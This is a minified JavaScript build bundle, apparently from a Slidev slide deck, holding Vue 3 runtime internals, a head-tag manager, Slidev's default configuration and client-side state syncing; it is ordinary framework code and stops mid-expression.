d=t.target=Vr(t.props,c);if(d){const p=d._lpa||d.firstChild;if(t.shapeFlag&16)if(Ds(t.props))t.anchor=u(i(e),t,a(e),s,o,r,l),t.targetAnchor=p;else{t.anchor=i(e);let f=p;for(;f;)if(f=i(f),f&&f.nodeType===8&&f.data==="teleport anchor"){t.targetAnchor=f,d._lpa=t.targetAnchor&&i(t.targetAnchor);break}u(p,t,d,s,o,r,l)}}return t.anchor&&i(t.anchor)}const Zf=Xf,Se=Symbol(void 0),Vl=Symbol(void 0),mn=Symbol(void 0),bo=Symbol(void 0),Bs=[];let Dt=null;function _(e=!1){Bs.push(Dt=e?null:[])}function Gf(){Bs.pop(),Dt=Bs[Bs.length-1]||null}let Us=1;function Ni(e){Us+=e}function wu(e){return e.dynamicChildren=Us>0?Dt||Qn:null,Gf(),Us>0&&Dt&&Dt.push(e),e}function $(e,t,s,o,r,l){return wu(n(e,t,s,o,r,l,!0))}function Y(e,t,s,o,r){return wu(C(e,t,s,o,r,!0))}function rs(e){return e?e.__v_isVNode===!0:!1}function _s(e,t){return e.type===t.type&&e.key===t.key}const nr="__vInternal",Eu=({key:e})=>e!=null?e:null,xo=({ref:e,ref_key:t,ref_for:s})=>e!=null?je(e)||ke(e)||ce(e)?{i:tt,r:e,k:t,f:!!s}:e:null;function n(e,t=null,s=null,o=0,r=null,l=e===Se?0:1,i=!1,a=!1){const c={__v_isVNode:!0,__v_skip:!0,type:e,props:t,key:t&&Eu(t),ref:t&&xo(t),scopeId:Go,slotScopeIds:null,children:s,component:null,suspense:null,ssContent:null,ssFallback:null,dirs:null,transition:null,el:null,anchor:null,target:null,targetAnchor:null,staticCount:0,shapeFlag:l,patchFlag:o,dynamicProps:r,dynamicChildren:null,appContext:null};return a?(Ul(c,s),l&128&&e.normalize(c)):s&&(c.shapeFlag|=je(s)?8:16),Us>0&&!i&&Dt&&(c.patchFlag>0||l&6)&&c.patchFlag!==32&&Dt.push(c),c}const C=Jf;function Jf(e,t=null,s=null,o=0,r=null,l=!1){if((!e||e===Ff)&&(e=mn),rs(e)){const a=Ln(e,t,!0);return s&&Ul(a,s),Us>0&&!l&&Dt&&(a.shapeFlag&6?Dt[Dt.indexOf(e)]=a:Dt.push(a)),a.patchFlag|=-2,a}if(im(e)&&(e=e.__vccOpts),t){t=de(t);let{class:a,style:c}=t;a&&!je(a)&&(t.class=Pe(a)),Re(c)&&(Xc(c)&&!oe(c)&&(c=at({},c)),t.style=Ze(c))}const i=je(e)?1:ru(e)?128:Kf(e)?64:Re(e)?4:ce(e)?2:0;return n(e,t,s,o,r,i,l,!0)}function de(e){return e?Xc(e)||nr in e?at({},e):e:null}function Ln(e,t,s=!1){const{props:o,ref:r,patchFlag:l,children:i}=e,a=t?Qe(o||{},t):o;return{__v_isVNode:!0,__v_skip:!0,type:e.type,props:a,key:a&&Eu(a),ref:t&&t.ref?s&&r?oe(r)?r.concat(xo(t)):[r,xo(t)]:xo(t):r,scopeId:e.scopeId,slotScopeIds:e.slotScopeIds,children:i,target:e.target,targetAnchor:e.targetAnchor,staticCount:e.staticCount,shapeFlag:e.shapeFlag,patchFlag:t&&e.type!==Se?l===-1?16:l|16:l,dynamicProps:e.dynamicProps,dynamicChildren:e.dynamicChildren,appContext:e.appContext,dirs:e.dirs,transition:e.transition,component:e.component,suspense:e.suspense,ssContent:e.ssContent&&Ln(e.ssContent),ssFallback:e.ssFallback&&Ln(e.ssFallback),el:e.el,anchor:e.anchor}}function y(e=" ",t=0){return C(Vl,null,e,t)}function em(e,t){const s=C(bo,null,e);return s.staticCount=t,s}function he(e="",t=!1){return t?(_(),Y(mn,null,e)):C(mn,null,e)}function Nt(e){return e==null||typeof e=="boolean"?C(mn):oe(e)?C(Se,null,e.slice()):typeof e=="object"?sn(e):C(Vl,null,String(e))}function sn(e){return e.el===null||e.memo?e:Ln(e)}function Ul(e,t){let s=0;const{shapeFlag:o}=e;if(t==null)t=null;else if(oe(t))s=16;else if(typeof t=="object")if(o&65){const r=t.default;r&&(r._c&&(r._d=!1),Ul(e,r()),r._c&&(r._d=!0));return}else{s=32;const r=t._;!r&&!(nr in t)?t._ctx=tt:r===3&&tt&&(tt.slots._===1?t._=1:(t._=2,e.patchFlag|=1024))}else ce(t)?(t={default:t,_ctx:tt},s=32):(t=String(t),o&64?(s=16,t=[y(t)]):s=8);e.children=t,e.shapeFlag|=s}function Qe(...e){const t={};for(let s=0;s<e.length;s++){const o=e[s];for(const r in o)if(r==="class")t.class!==o.class&&(t.class=Pe([t.class,o.class]));else if(r==="style")t.style=Ze([t.style,o.style]);else if(Vo(r)){const l=t[r],i=o[r];i&&l!==i&&!(oe(l)&&l.includes(i))&&(t[r]=l?[].concat(l,i):i)}else r!==""&&(t[r]=o[r])}return t}function wt(e,t,s,o=null){Ot(e,t,7,[s,o])}const tm=xu();let nm=0;function sm(e,t,s){const o=e.type,r=(t?t.appContext:e.appContext)||tm,l={uid:nm++,vnode:e,type:o,parent:t,appContext:r,root:null,next:null,subTree:null,effect:null,update:null,scope:new Mc(!0),render:null,proxy:null,exposed:null,exposeProxy:null,withProxy:null,provides:t?t.provides:Object.create(r.provides),accessCache:null,renderCache:[],components:null,directives:null,propsOptions:yu(o,r),emitsOptions:ou(o,r),emit:null,emitted:null,propsDefaults:Oe,inheritAttrs:o.inheritAttrs,ctx:Oe,data:Oe,props:Oe,attrs:Oe,slots:Oe,refs:Oe,setupState:Oe,setupContext:null,suspense:s,suspenseId:s?s.pendingId:0,asyncDep:null,asyncResolved:!1,isMounted:!1,isUnmounted:!1,isDeactivated:!1,bc:null,c:null,bm:null,m:null,bu:null,u:null,um:null,bum:null,da:null,a:null,rtg:null,rtc:null,ec:null,sp:null};return l.ctx={_:l},l.root=t?t.root:l,l.emit=mf.bind(null,l),e.ce&&e.ce(l),l}let Ke=null;const hn=()=>Ke||tt,ls=e=>{Ke=e,e.scope.on()},In=()=>{Ke&&Ke.scope.off(),Ke=null};function Au(e){return e.vnode.shapeFlag&4}let Ws=!1;function om(e,t=!1){Ws=t;const{props:s,children:o}=e.vnode,r=Au(e);Rf(e,s,r,t),jf(e,o);const l=r?rm(e,t):void 0;return Ws=!1,l}function rm(e,t){const s=e.type;e.accessCache=Object.create(null),e.proxy=Xo(new Proxy(e.ctx,Of));const{setup:o}=s;if(o){const r=e.setupContext=o.length>1?ku(e):null;ls(e),us();const l=an(o,e,0,[e.props,r]);if(ds(),In(),Ic(l)){if(l.then(In,In),t)return l.then(i=>{qi(e,i,t)}).catch(i=>{Qo(i,e,0)});e.asyncDep=l}else qi(e,l,t)}else Su(e,t)}function qi(e,t,s){ce(t)?e.type.__ssrInlineRender?e.ssrRender=t:e.render=t:Re(t)&&(e.setupState=Zc(t)),Su(e,s)}let ji;function Su(e,t,s){const o=e.type;if(!e.render){if(!t&&ji&&!o.render){const r=o.template||jl(e).template;if(r){const{isCustomElement:l,compilerOptions:i}=e.appContext.config,{delimiters:a,compilerOptions:c}=o,u=at(at({isCustomElement:l,delimiters:a},i),c);o.render=ji(r,u)}}e.render=o.render||Ft}ls(e),us(),If(e),ds(),In()}function lm(e){return new Proxy(e.attrs,{get(t,s){return xt(e,"get","$attrs"),t[s]}})}function ku(e){const t=o=>{e.exposed=o||{}};let s;return{get attrs(){return s||(s=lm(e))},slots:e.slots,emit:e.emit,expose:t}}function sr(e){if(e.exposed)return e.exposeProxy||(e.exposeProxy=new Proxy(Zc(Xo(e.exposed)),{get(t,s){if(s in t)return t[s];if(s in Fo)return Fo[s](e)}}))}function Ur(e,t=!0){return ce(e)?e.displayName||e.name:e.name||t&&e.__name}function im(e){return ce(e)&&"__vccOpts"in e}const D=(e,t)=>af(e,t,Ws);function am(){return cm().slots}function cm(){const e=hn();return e.setupContext||(e.setupContext=ku(e))}function vt(e,t,s){const o=arguments.length;return o===2?Re(t)&&!oe(t)?rs(t)?C(e,null,[t]):C(e,t):C(e,null,t):(o>3?s=Array.prototype.slice.call(arguments,2):o===3&&rs(s)&&(s=[s]),C(e,t,s))}const um="3.2.39",dm="http://www.w3.org/2000/svg",Sn=typeof document<"u"?document:null,Hi=Sn&&Sn.createElement("template"),pm={insert:(e,t,s)=>{t.insertBefore(e,s||null)},remove:e=>{const t=e.parentNode;t&&t.removeChild(e)},createElement:(e,t,s,o)=>{const r=t?Sn.createElementNS(dm,e):Sn.createElement(e,s?{is:s}:void 0);return e==="select"&&o&&o.multiple!=null&&r.setAttribute("multiple",o.multiple),r},createText:e=>Sn.createTextNode(e),createComment:e=>Sn.createComment(e),setText:(e,t)=>{e.nodeValue=t},setElementText:(e,t)=>{e.textContent=t},parentNode:e=>e.parentNode,nextSibling:e=>e.nextSibling,querySelector:e=>Sn.querySelector(e),setScopeId(e,t){e.setAttribute(t,"")},cloneNode(e){const t=e.cloneNode(!0);return"_value"in e&&(t._value=e._value),t},insertStaticContent(e,t,s,o,r,l){const i=s?s.previousSibling:t.lastChild;if(r&&(r===l||r.nextSibling))for(;t.insertBefore(r.cloneNode(!0),s),!(r===l||!(r=r.nextSibling)););else{Hi.innerHTML=o?`<svg>${e}</svg>`:e;const a=Hi.content;if(o){const c=a.firstChild;for(;c.firstChild;)a.appendChild(c.firstChild);a.removeChild(c)}t.insertBefore(a,s)}return[i?i.nextSibling:t.firstChild,s?s.previousSibling:t.lastChild]}};function fm(e,t,s){const o=e._vtc;o&&(t=(t?[t,...o]:[...o]).join(" ")),t==null?e.removeAttribute("class"):s?e.setAttribute("class",t):e.className=t}function mm(e,t,s){const o=e.style,r=je(s);if(s&&!r){for(const l in s)Wr(o,l,s[l]);if(t&&!je(t))for(const l in t)s[l]==null&&Wr(o,l,"")}else{const l=o.display;r?t!==s&&(o.cssText=s):t&&e.removeAttribute("style"),"_vod"in e&&(o.display=l)}}const zi=/\s*!important$/;function Wr(e,t,s){if(oe(s))s.forEach(o=>Wr(e,t,o));else if(s==null&&(s=""),t.startsWith("--"))e.setProperty(t,s);else{const o=hm(e,t);zi.test(s)?e.setProperty(Rn(o),s.replace(zi,""),"important"):e[o]=s}}const Vi=["Webkit","Moz","ms"],pr={};function hm(e,t){const s=pr[t];if(s)return s;let o=Vt(t);if(o!=="filter"&&o in e)return pr[t]=o;o=Yo(o);for(let r=0;r<Vi.length;r++){const l=Vi[r]+o;if(l in e)return pr[t]=l}return t}const Ui="http://www.w3.org/1999/xlink";function gm(e,t,s,o,r){if(o&&t.startsWith("xlink:"))s==null?e.removeAttributeNS(Ui,t.slice(6,t.length)):e.setAttributeNS(Ui,t,s);else{const l=fp(t);s==null||l&&!Bc(s)?e.removeAttribute(t):e.setAttribute(t,l?"":s)}}function ym(e,t,s,o,r,l,i){if(t==="innerHTML"||t==="textContent"){o&&i(o,r,l),e[t]=s==null?"":s;return}if(t==="value"&&e.tagName!=="PROGRESS"&&!e.tagName.includes("-")){e._value=s;const c=s==null?"":s;(e.value!==c||e.tagName==="OPTION")&&(e.value=c),s==null&&e.removeAttribute(t);return}let a=!1;if(s===""||s==null){const c=typeof e[t];c==="boolean"?s=Bc(s):s==null&&c==="string"?(s="",a=!0):c==="number"&&(s=0,a=!0)}try{e[t]=s}catch{}a&&e.removeAttribute(t)}const[Cu,vm]=(()=>{let e=Date.now,t=!1;if(typeof window<"u"){Date.now()>document.createEvent("Event").timeStamp&&(e=performance.now.bind(performance));const s=navigator.userAgent.match(/firefox\/(\d+)/i);t=!!(s&&Number(s[1])<=53)}return[e,t]})();let Yr=0;const _m=Promise.resolve(),bm=()=>{Yr=0},xm=()=>Yr||(_m.then(bm),Yr=Cu());function Un(e,t,s,o){e.addEventListener(t,s,o)}function wm(e,t,s,o){e.removeEventListener(t,s,o)}function Em(e,t,s,o,r=null){const l=e._vei||(e._vei={}),i=l[t];if(o&&i)i.value=o;else{const[a,c]=Am(t);if(o){const u=l[t]=Sm(o,r);Un(e,a,u,c)}else i&&(wm(e,a,i,c),l[t]=void 0)}}const Wi=/(?:Once|Passive|Capture)$/;function Am(e){let t;if(Wi.test(e)){t={};let o;for(;o=e.match(Wi);)e=e.slice(0,e.length-o[0].length),t[o[0].toLowerCase()]=!0}return[e[2]===":"?e.slice(3):Rn(e.slice(2)),t]}function Sm(e,t){const s=o=>{const r=o.timeStamp||Cu();(vm||r>=s.attached-1)&&Ot(km(o,s.value),t,5,[o])};return s.value=e,s.attached=xm(),s}function km(e,t){if(oe(t)){const s=e.stopImmediatePropagation;return e.stopImmediatePropagation=()=>{s.call(e),e._stopped=!0},t.map(o=>r=>!r._stopped&&o&&o(r))}else return t}const Yi=/^on[a-z]/,Cm=(e,t,s,o,r=!1,l,i,a,c)=>{t==="class"?fm(e,o,r):t==="style"?mm(e,s,o):Vo(t)?Al(t)||Em(e,t,s,o,i):(t[0]==="."?(t=t.slice(1),!0):t[0]==="^"?(t=t.slice(1),!1):$m(e,t,o,r))?ym(e,t,o,l,i,a,c):(t==="true-value"?e._trueValue=o:t==="false-value"&&(e._falseValue=o),gm(e,t,o,r))};function $m(e,t,s,o){return o?!!(t==="innerHTML"||t==="textContent"||t in e&&Yi.test(t)&&ce(s)):t==="spellcheck"||t==="draggable"||t==="translate"||t==="form"||t==="list"&&e.tagName==="INPUT"||t==="type"&&e.tagName==="TEXTAREA"||Yi.test(t)&&je(s)?!1:t in e}const Ki=e=>{const t=e.props["onUpdate:modelValue"]||!1;return oe(t)?s=>Gn(t,s):t};function Dm(e){e.target.composing=!0}function Xi(e){const t=e.target;t.composing&&(t.composing=!1,t.dispatchEvent(new Event("input")))}const Kr={created(e,{modifiers:{lazy:t,trim:s,number:o}},r){e._assign=Ki(r);const l=o||r.props&&r.props.type==="number";Un(e,t?"change":"input",i=>{if(i.target.composing)return;let a=e.value;s&&(a=a.trim()),l&&(a=Ir(a)),e._assign(a)}),s&&Un(e,"change",()=>{e.value=e.value.trim()}),t||(Un(e,"compositionstart",Dm),Un(e,"compositionend",Xi),Un(e,"change",Xi))},mounted(e,{value:t}){e.value=t==null?"":t},beforeUpdate(e,{value:t,modifiers:{lazy:s,trim:o,number:r}},l){if(e._assign=Ki(l),e.composing||document.activeElement===e&&e.type!=="range"&&(s||o&&e.value.trim()===t||(r||e.type==="number")&&Ir(e.value)===t))return;const i=t==null?"":t;e.value!==i&&(e.value=i)}},Bm={esc:"escape",space:" ",up:"arrow-up",left:"arrow-left",right:"arrow-right",down:"arrow-down",delete:"backspace"},Qi=(e,t)=>s=>{if(!("key"in s))return;const o=Rn(s.key);if(t.some(r=>r===o||Bm[r]===o))return e(s)},$u={beforeMount(e,{value:t},{transition:s}){e._vod=e.style.display==="none"?"":e.style.display,s&&t?s.beforeEnter(e):bs(e,t)},mounted(e,{value:t},{transition:s}){s&&t&&s.enter(e)},updated(e,{value:t,oldValue:s},{transition:o}){!t!=!s&&(o?t?(o.beforeEnter(e),bs(e,!0),o.enter(e)):o.leave(e,()=>{bs(e,!1)}):bs(e,t))},beforeUnmount(e,{value:t}){bs(e,t)}};function bs(e,t){e.style.display=t?e._vod:"none"}const Fm=at({patchProp:Cm},pm);let Zi;function Om(){return Zi||(Zi=Uf(Fm))}const Im=(...e)=>{const t=Om().createApp(...e),{mount:s}=t;return t.mount=o=>{const r=Tm(o);if(!r)return;const l=t._component;!ce(l)&&!l.render&&!l.template&&(l.template=r.innerHTML),r.innerHTML="";const i=s(r,!1,r instanceof SVGElement);return r instanceof Element&&(r.removeAttribute("v-cloak"),r.setAttribute("data-v-app","")),i},t};function Tm(e){return je(e)?document.querySelector(e):e}var Pm=Object.defineProperty,Gi=Object.getOwnPropertySymbols,Mm=Object.prototype.hasOwnProperty,Lm=Object.prototype.propertyIsEnumerable,Ji=(e,t,s)=>t in e?Pm(e,t,{enumerable:!0,configurable:!0,writable:!0,value:s}):e[t]=s,Rm=(e,t)=>{for(var s in t||(t={}))Mm.call(t,s)&&Ji(e,s,t[s]);if(Gi)for(var s of Gi(t))Lm.call(t,s)&&Ji(e,s,t[s]);return e},Du="usehead",ea="head:count",fr="data-head-attrs",Bu="data-meta-body",Nm=(e,t,s)=>{const o=s.createElement(e);for(const r of Object.keys(t))if(r==="body"&&t.body===!0)o.setAttribute(Bu,"true");else{let l=t[r];if(r==="key"||l===!1)continue;r==="children"?o.textContent=l:o.setAttribute(r,l)}return o};function ta(e,t){if(e instanceof HTMLElement&&t instanceof HTMLElement){const s=t.getAttribute("nonce");if(s&&!e.getAttribute("nonce")){const o=t.cloneNode(!0);return o.setAttribute("nonce",""),o.nonce=s,s===e.nonce&&e.isEqualNode(o)}}return e.isEqualNode(t)}var qm=e=>{const t=["key","id","name","property"];for(const s of t){const o=typeof e.getAttribute=="function"?e.hasAttribute(s)?e.getAttribute(s):void 0:e[s];if(o!==void 0)return{name:s,value:o}}},jm=()=>{const e=N(Du);if(!e)throw new Error("You may forget to apply app.use(head)");return e},Hm=["title","meta","link","base","style","script","noscript","htmlAttrs","bodyAttrs"],zm=(e,t)=>e==null?"":typeof e=="string"?e.replace("%s",t!=null?t:""):e(w(t)),Vm=e=>{const t=[],s=Object.keys(e);for(const o of s)if(e[o]!=null)switch(o){case"title":t.push({tag:o,props:{children:e[o]}});break;case"titleTemplate":break;case"base":t.push({tag:o,props:Rm({key:"default"},e[o])});break;default:if(Hm.includes(o)){const r=e[o];Array.isArray(r)?r.forEach(l=>{t.push({tag:o,props:w(l)})}):r&&t.push({tag:o,props:r})}break}return t},na=(e,t)=>{const s=e.getAttribute(fr);if(s)for(const r of s.split(","))r in t||e.removeAttribute(r);const o=[];for(const r in t){const l=t[r];l!=null&&(l===!1?e.removeAttribute(r):e.setAttribute(r,l),o.push(r))}o.length?e.setAttribute(fr,o.join(",")):e.removeAttribute(fr)},Um=(e=window.document,t,s)=>{var o,r;const l=e.head,i=e.body;let a=l.querySelector(`meta[name="${ea}"]`),c=i.querySelectorAll(`[${Bu}]`);const u=a?Number(a.getAttribute("content")):0,d=[],p=[];if(c)for(let m=0;m<c.length;m++)c[m]&&((o=c[m].tagName)==null?void 0:o.toLowerCase())===t&&p.push(c[m]);if(a)for(let m=0,h=a.previousElementSibling;m<u;m++,h=(h==null?void 0:h.previousElementSibling)||null)((r=h==null?void 0:h.tagName)==null?void 0:r.toLowerCase())===t&&d.push(h);else a=e.createElement("meta"),a.setAttribute("name",ea),a.setAttribute("content","0"),l.append(a);let f=s.map(m=>{var h;return{element:Nm(m.tag,m.props,e),body:(h=m.props.body)!=null?h:!1}});f=f.filter(m=>{for(let h=0;h<d.length;h++){const x=d[h];if(ta(x,m.element))return d.splice(h,1),!1}for(let h=0;h<p.length;h++){const x=p[h];if(ta(x,m.element))return p.splice(h,1),!1}return!0}),p.forEach(m=>{var h;return(h=m.parentNode)==null?void 0:h.removeChild(m)}),d.forEach(m=>{var h;return(h=m.parentNode)==null?void 0:h.removeChild(m)}),f.forEach(m=>{m.body===!0?i.insertAdjacentElement("beforeend",m.element):l.insertBefore(m.element,a)}),a.setAttribute("content",""+(u-d.length+f.filter(m=>!m.body).length))},Wm=e=>{let t=[],s=new Set;e&&t.push(Tt(e));const o={install(r){r.config.globalProperties.$head=o,r.provide(Du,o)},get headTags(){const r=[],l=t.map(i=>w(i).titleTemplate).reverse().find(i=>i!=null);return t.forEach(i=>{Vm(w(i)).forEach(c=>{if(c.tag==="meta"||c.tag==="base"||c.tag==="script"){const u=qm(c.props);if(u){let d=-1;for(let p=0;p<r.length;p++){const f=r[p],m=f.props[u.name],h=c.props[u.name];if(f.tag===c.tag&&m===h){d=p;break}}d!==-1&&r.splice(d,1)}}l&&c.tag==="title"&&(c.props.children=zm(l,c.props.children)),r.push(c)})}),r},addHeadObjs(r){t.push(r)},removeHeadObjs(r){t=t.filter(l=>l!==r)},updateDOM(r=window.document){let l,i={},a={};const c={};for(const d of o.headTags){if(d.tag==="title"){l=d.props.children;continue}if(d.tag==="htmlAttrs"){Object.assign(i,d.props);continue}if(d.tag==="bodyAttrs"){Object.assign(a,d.props);continue}c[d.tag]=c[d.tag]||[],c[d.tag].push(d)}l!==void 0&&(r.title=l),na(r.documentElement,i),na(r.body,a);const u=new Set([...Object.keys(c),...s]);for(const d of u)Um(r,d,c[d]||[]);s.clear(),Object.keys(c).forEach(d=>s.add(d))}};return o},Ym=typeof window<"u",Km=e=>{const t=jm(),s=z(e);t.addHeadObjs(s),Ym&&(to(()=>{t.updateDOM()}),er(()=>{t.removeHeadObjs(s),t.updateDOM()}))};const Fs=Symbol("v-click-clicks"),kn=Symbol("v-click-clicks-elements"),Xr=Symbol("v-click-clicks-order-map"),Os=Symbol("v-click-clicks-disabled"),Fu=Symbol("slidev-slide-scale"),U=Symbol("slidev-slidev-context"),Xm=Symbol("slidev-route"),Qm=Symbol("slidev-slide-context"),En="slidev-vclick-target",mr="slidev-vclick-hidden",Zm="slidev-vclick-fade",hr="slidev-vclick-hidden-explicitly",xs="slidev-vclick-current",ho="slidev-vclick-prior";function Qr(e,t){if(!e)return!1;const s=e.indexOf(t);return s>=0?(e.splice(s,1),!0):!1}function Gm(...e){let t,s,o;e.length===1?(t=0,o=1,[s]=e):[t,s,o=1]=e;const r=[];let l=t;for(;l<s;)r.push(l),l+=o||1;return r}function Jm(e){return e!=null}function eh(e,t){return Object.fromEntries(Object.entries(e).map(([s,o])=>t(s,o)).filter(Jm))}const Dn={theme:"default",titleTemplate:"%s - Slidev",addons:[],remoteAssets:!1,monaco:"dev",download:!1,info:`<h2>Slidev Starter Template</h2>
<p>Presentation slides for developers.</p>
<p>Learn more at <a href="https://sli.dev" target="_blank" rel="noopener">Sli.dev</a></p>
`,highlighter:"shiki",lineNumbers:!0,colorSchema:"auto",routerMode:"history",aspectRatio:1.7777777777777777,canvasWidth:980,exportFilename:"",selectable:!1,themeConfig:{},fonts:{sans:['"Avenir Next"','"Nunito Sans"',"ui-sans-serif","system-ui","-apple-system","BlinkMacSystemFont",'"Segoe UI"',"Roboto",'"Helvetica Neue"',"Arial",'"Noto Sans"',"sans-serif",'"Apple Color Emoji"','"Segoe UI Emoji"','"Segoe UI Symbol"','"Noto Color Emoji"'],serif:["ui-serif","Georgia","Cambria",'"Times New Roman"',"Times","serif"],mono:['"Fira Code"',"ui-monospace","SFMono-Regular","Menlo","Monaco","Consolas",'"Liberation Mono"','"Courier New"',"monospace"],webfonts:["Avenir Next","Nunito Sans","Fira Code"],provider:"google",local:["Avenir Next"],italic:!1,weights:["200","400","600"]},favicon:"https://cdn.jsdelivr.net/gh/slidevjs/slidev/assets/favicon.png",drawings:{enabled:!0,persist:!1,presenterOnly:!1,syncAll:!0},plantUmlServer:"https://www.plantuml.com/plantuml",codeCopy:!0,record:"dev",css:"unocss"},we=Dn;var $c;const cn=($c=we.aspectRatio)!=null?$c:16/9;var Dc;const Tn=(Dc=we.canvasWidth)!=null?Dc:980,Ou=Math.round(Tn/cn),Iu=D(()=>eh(we.themeConfig||{},(e,t)=>[`--slidev-theme-${e}`,t]));function At(e,t,s){Object.defineProperty(e,t,{value:s,writable:!0,enumerable:!1})}const Nn=Me({page:0,clicks:0});let th=[],nh=[];At(Nn,"$syncUp",!0);At(Nn,"$syncDown",!0);At(Nn,"$paused",!1);At(Nn,"$onSet",e=>th.push(e));At(Nn,"$onPatch",e=>nh.push(e));At(Nn,"$patch",async()=>!1);function Tu(e,t,s=!1){const o=[];let r=!1,l=!1,i,a;const c=Me(t);function u(m){o.push(m)}function d(m,h){clearTimeout(i),r=!0,c[m]=h,i=setTimeout(()=>r=!1,0)}function p(m){r||(clearTimeout(a),l=!0,Object.entries(m).forEach(([h,x])=>{c[h]=x}),a=setTimeout(()=>l=!1,0))}function f(m){let h;s?s&&window.addEventListener("storage",b=>{b&&b.key===m&&b.newValue&&p(JSON.parse(b.newValue))}):(h=new BroadcastChannel(m),h.addEventListener("message",b=>p(b.data)));function x(){!s&&h&&!l?h.postMessage(Ee(c)):s&&!l&&window.localStorage.setItem(m,JSON.stringify(c)),r||o.forEach(b=>b(c))}if(me(c,x,{deep:!0}),s){const b=window.localStorage.getItem(m);b&&p(JSON.parse(b))}}return{init:f,onPatch:u,patch:d,state:c}}const{init:sh,onPatch:oh,patch:sa,state:gr}=Tu(Nn,{page:1,clicks:0}),qn=Me({});let rh=[],lh=[];At(qn,"$syncUp",!0);At(qn,"$syncDown",!0);At(qn,"$paused",!1);At(qn,"$onSet",e=>rh.push(e));At(qn,"$onPatch",e=>lh.push(e));At(qn,"$patch",async()=>!1);const{init:ih,onPatch:ah,patch:Pu,state:Io}=Tu(qn,{},!1),ch="modulepreload",uh=function(e){return"/crescer/dia-2/"+e},oa={},fs=function(t,s,o){return!s||s.length===0?t():Promise.all(s.map(r=>{if(r=uh(r),r in oa)return;oa[r]=!0;const l=r.endsWith(".css"),i=l?'[rel="stylesheet"]':"";if(document.querySelector(`link[href="${r}"]${i}`))return;const a=document.createElement("link");if(a.rel=l?"stylesheet":ch,l||(a.as="script",a.crossOrigin=""),a.href=r,document.head.appendChild(a),l)return new Promise((c,u)=>{a.addEventListener("load",c),a.addEventListener("error",()=>u(new Error(`Unable to preload CSS for ${r}`)))})})).then(()=>t())};var ra;const Pt=typeof window<"u",dh=e=>typeof e<"u",ph=Object.prototype.toString,To=e=>typeof e=="function",fh=e=>typeof e=="number",Mu=e=>typeof e=="string",Zr=e=>ph.call(e)==="[object Object]",Gr=()=>+Date.now(),Pn=()=>{};Pt&&((ra=window==null?void 0:window.navigator)==null?void 0:ra.userAgent)&&/iP(ad|hone|od)/.test(window.navigator.userAgent);function lt(e){return typeof e=="function"?e():w(e)}function mh(e,t){function s(...o){e(()=>t.apply(this,o),{fn:t,thisArg:this,args:o})}return s}const Lu=e=>e();function hh(e=Lu){const t=z(!0);function s(){t.value=!1}function o(){t.value=!0}return{isActive:t,pause:s,resume:o,eventFilter:(...l)=>{t.value&&e(...l)}}}function gh(e){return e}function yh(e,t){var s;if(typeof e=="number")return e+t;const o=((s=e.match(/^-?[0-9]+\.?[0-9]*/))==null?void 0:s[0])||"",r=e.slice(o.length),l=parseFloat(o)+t;return Number.isNaN(l)?e:l+r}function vh(e,t){let s,o,r;const l=z(!0),i=()=>{l.value=!0,r()};me(e,i,{flush:"sync"});const a=To(t)?t:t.get,c=To(t)?void 0:t.set,u=Gc((d,p)=>(o=d,r=p,{get(){return l.value&&(s=a(),l.value=!1),o(),s},set(f){c==null||c(f)}}));return Object.isExtensible(u)&&(u.trigger=i),u}function Gt(e){return Lc()?(Rc(e),!0):!1}function _h(e){if(!ke(e))return Me(e);const t=new Proxy({},{get(s,o,r){return w(Reflect.get(e.value,o,r))},set(s,o,r){return ke(e.value[o])&&!ke(r)?e.value[o].value=r:e.value[o]=r,!0},deleteProperty(s,o){return Reflect.deleteProperty(e.value,o)},has(s,o){return Reflect.has(e.value,o)},ownKeys(){return Object.keys(e.value)},getOwnPropertyDescriptor(){return{enumerable:!0,configurable:!0}}});return Me(t)}function bh(e){return typeof e=="function"?D(e):z(e)}var xh=Object.defineProperty,wh=Object.defineProperties,Eh=Object.getOwnPropertyDescriptors,la=Object.getOwnPropertySymbols,Ah=Object.prototype.hasOwnProperty,Sh=Object.prototype.propertyIsEnumerable,ia=(e,t,s)=>t in e?xh(e,t,{enumerable:!0,configurable:!0,writable:!0,value:s}):e[t]=s,kh=(e,t)=>{for(var s in t||(t={}))Ah.call(t,s)&&ia(e,s,t[s]);if(la)for(var s of la(t))Sh.call(t,s)&&ia(e,s,t[s]);return e},Ch=(e,t)=>wh(e,Eh(t));function $h(e){if(!ke(e))return sf(e);const t=Array.isArray(e.value)?new Array(e.value.length):{};for(const s in e.value)t[s]=Gc(()=>({get(){return e.value[s]},set(o){if(Array.isArray(e.value)){const r=[...e.value];r[s]=o,e.value=r}else{const r=Ch(kh({},e.value),{[s]:o});Object.setPrototypeOf(r,e.value),e.value=r}}}));return t}function Dh(e,t=!0){hn()?du(e):t?e():et(e)}function Ru(e,t=!0){hn()?ps(e):t?e():et(e)}function Bh(e){hn()&&tr(e)}function Fh(e,t=1e3,s={}){const{immediate:o=!0,immediateCallback:r=!1}=s;let l=null;const i=z(!1);function a(){l&&(clearInterval(l),l=null)}function c(){i.value=!1,a()}function u(){w(t)<=0||(i.value=!0,r&&e(),a(),l=setInterval(e,lt(t)))}if(o&&Pt&&u(),ke(t)){const d=me(t,()=>{i.value&&Pt&&u()});Gt(d)}return Gt(c),{isActive:i,pause:c,resume:u}}function Oh(e,t,s={}){const{immediate:o=!0}=s,r=z(!1);let l=null;function i(){l&&(clearTimeout(l),l=null)}function a(){r.value=!1,i()}function c(...u){i(),r.value=!0,l=setTimeout(()=>{r.value=!1,l=null,e(...u)},lt(t))}return o&&(r.value=!0,Pt&&c()),Gt(a),{isPending:r,start:c,stop:a}}function Nu(e=!1,t={}){const{truthyValue:s=!0,falsyValue:o=!1}=t,r=ke(e),l=z(e);function i(a){if(arguments.length)return l.value=a,l.value;{const c=lt(s);return l.value=l.value===c?lt(o):c,l.value}}return r?i:[l,i]}var aa=Object.getOwnPropertySymbols,Ih=Object.prototype.hasOwnProperty,Th=Object.prototype.propertyIsEnumerable,Ph=(e,t)=>{var s={};for(var o in e)Ih.call(e,o)&&t.indexOf(o)<0&&(s[o]=e[o]);if(e!=null&&aa)for(var o of aa(e))t.indexOf(o)<0&&Th.call(e,o)&&(s[o]=e[o]);return s};function Mh(e,t,s={}){const o=s,{eventFilter:r=Lu}=o,l=Ph(o,["eventFilter"]);return me(e,mh(r,t),l)}var Lh=Object.defineProperty,Rh=Object.defineProperties,Nh=Object.getOwnPropertyDescriptors,Po=Object.getOwnPropertySymbols,qu=Object.prototype.hasOwnProperty,ju=Object.prototype.propertyIsEnumerable,ca=(e,t,s)=>t in 